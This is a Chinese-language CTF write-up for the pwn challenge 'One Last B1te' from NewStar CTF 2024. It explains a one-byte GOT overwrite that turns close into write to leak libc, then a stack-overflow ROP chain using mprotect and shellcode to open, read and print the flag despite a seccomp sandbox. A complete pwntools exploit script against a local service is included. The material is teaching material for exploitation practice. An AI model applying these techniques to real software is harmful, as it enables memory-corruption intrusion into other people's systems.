# One Last B1te

> 分类：Pwn

## 题目描述
程序无 PIE、无 canary、Partial RELRO，存在延迟绑定 + GOT 表可写。沙箱禁用了 sendfile、execve、execveat。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-18h] BYREF
  _BYTE v5[16]; // [rsp+10h] [rbp-10h] BYREF

  init(argc, argv, envp);
  sandbox();
  write(1, "Show me your UN-Lucky number : ", 0x20uLL);
  read(0, &buf, 8uLL);  // 读入一个地址
  write(1, "Try to hack your UN-Lucky number with one byte : ", 0x32uLL);
  read(0, buf, 1uLL);   // 往上面读入的地址中写入一个字符
  read(0, v5, 0x110uLL);// 往栈上读入内容，有栈溢出
  close(1);             // 关闭stdout
  return 0;
}
```

## 考察知识点
- 任意地址写（1 字节）
- 延迟绑定 / GOT 表
- 栈溢出 + 泄露 libc
- ORW（open + read + write）
- glibc 2.39 下控制 rdx 寄存器

## 解法
程序只有一次任意地址写的机会，且新版 Ubuntu 24 编译优化掉了 CSU，难以利用 ELF 的 gadget 进行 ROP。思路是泄露 libc 后利用 libc/ld 的 gadget 做 ROP，执行 open + read + write 输出 flag。

利用一个字节任意地址写，把 `close` 函数的 GOT 表数值最低一字节改为 `write` 函数的 PLT 表地址（存在延迟绑定，`close` 第一次调用前指向 PLT 表项）。之后 `close(1)` 变成 `write(1, v5, 0x110uLL)`，泄露栈上的 libc 地址，再用栈溢出回到 main 做 ROP。

由于 glibc 2.39 不易控制 rdx，使用 `pop rax` + `xchg eax, edx` 设置 rdx。

```python
from pwn import*
from Crypto.Util.number import long_to_bytes, bytes_to_long

context.log_level='debug'
context(arch='amd64',os='linux')
context.terminal=['tmux','splitw','-h']

ELFpath = './pwn'
p=remote('localhost',11451)

close_got=0x404028
write_plt=0x4010c0

p.sendafter("Show me your UN-Lucky number :",p64(close_got))
p.sendafter("Try to hack your UN-Lucky number with one byte :",b'\xc0')
ret=0x0401447
main=0x4013a3
rubbish=0x404000+0x800
payload=b'a'*0x18+p64(ret)+p64(main)
pause()

p.send(payload)
p.recvuntil(b'a'*0x18)
p.recv(0xb8-0x18)
libc_base=u64(p.recv(6)+b'\x00\x00')-0x710b26c2a28b+0x710b26c00000

p.sendafter("Show me your UN-Lucky number :",p64(rubbish))
p.sendafter("Try to hack your UN-Lucky number with one byte :",b'\x70')

pop_rdi=libc_base+0x010f75b
pop_rsi=libc_base+0x110a4d
binsh=libc_base+0x1cb42f
xchg_edx_eax=libc_base+0x01a7f27
pop_rax=libc_base+0x0dd237
open_a=libc_base+0x011B120
read_a=libc_base+0x011BA50
mprotect=libc_base+0x00125C10

payload=b'a'*0x18+p64(pop_rdi)+p64(libc_base+0x202000)+p64(pop_rsi)+p64(0x2000)+p64(pop_rax)+p64(7)+p64(xchg_edx_eax)+p64(mprotect)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(libc_base+0x202000)+p64(pop_rax)+p64(0x1000)+p64(xchg_edx_eax)+p64(read_a)+p64(libc_base+0x202000)

p.send(payload)

shellcode=''
shellcode+=shellcraft.open('./flag',0,0)
shellcode+=shellcraft.read('rax',libc_base+0x202000+0x800,0x100)
shellcode+=shellcraft.write(2,libc_base+0x202000+0x800,'rax')
p.send(asm(shellcode))

p.interactive()
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week3/pwn/one-last-b1te.html
